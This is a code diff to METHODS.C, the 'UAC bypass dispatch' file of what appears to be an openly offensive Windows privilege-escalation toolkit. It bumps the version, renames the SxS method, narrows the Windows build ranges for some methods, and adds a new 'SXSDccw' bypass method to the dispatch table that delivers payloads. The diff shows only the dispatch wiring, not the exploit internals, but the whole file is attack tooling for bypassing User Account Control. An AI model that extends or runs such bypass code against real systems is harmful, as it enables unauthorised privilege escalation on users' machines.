@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.74
+*  VERSION:     2.75
 *
-*  DATE:        20 June 2017
+*  DATE:        30 June 2017
 *
 *  UAC bypass dispatch.
 *
@@ -33,7 +33,7 @@ UCM_API(MethodGWX);
 UCM_API(MethodSysprep4);
 UCM_API(MethodManifest);
 UCM_API(MethodInetMg);
-UCM_API(MethodSxS);
+UCM_API(MethodSXS);
 UCM_API(MethodDism);
 UCM_API(MethodComet);
 UCM_API(MethodEnigma0x3);
@@ -48,6 +48,7 @@ UCM_API(MethodMsSettings);
 UCM_API(MethodTyranid);
 UCM_API(MethodTokenMod);
 UCM_API(MethodJunction);
+UCM_API(MethodSXSDccw);
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -70,9 +71,9 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodSysprep4, NULL, { 9600, 14367 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodManifest, NULL, { 7600, 14367 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodInetMg, NULL, { 7600, 14367 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodMMC2, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodSxS, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodSxS, NULL, { 7600, MAXDWORD }, IKAZUCHI_ID, FALSE, TRUE, TRUE },
+    { MethodMMC2, NULL, { 7600, 16232 }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodSXS, NULL, { 7600, 16232 }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodSXS, NULL, { 7600, MAXDWORD }, IKAZUCHI_ID, FALSE, TRUE, TRUE },
     { MethodDism, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodComet, NULL, { 7600, 15031 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodEnigma0x3, NULL, { 7600, 15031 }, FUBUKI_ID, FALSE, TRUE, FALSE },
@@ -86,7 +87,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodMsSettings, NULL, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodTyranid, NULL, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodTokenMod, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodJunction, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodJunction, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodSXSDccw, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -410,7 +412,7 @@ UCM_API(MethodInetMg)
     return ucmInetMgrMethod(PayloadCode, PayloadSize);
 }
 
-UCM_API(MethodSxS)
+UCM_API(MethodSXS)
 {
     BOOL bConsentItself = FALSE;
     LPWSTR lpTargetDirectory = NULL;
@@ -695,4 +697,12 @@ UCM_API(MethodJunction)
     UNREFERENCED_PARAMETER(ExtraContext);
 
     return ucmJunctionMethod(PayloadCode, PayloadSize);
+}
+
+UCM_API(MethodSXSDccw)
+{
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(ExtraContext);
+
+    return ucmSXSMethodDccw(PayloadCode, PayloadSize);
 }
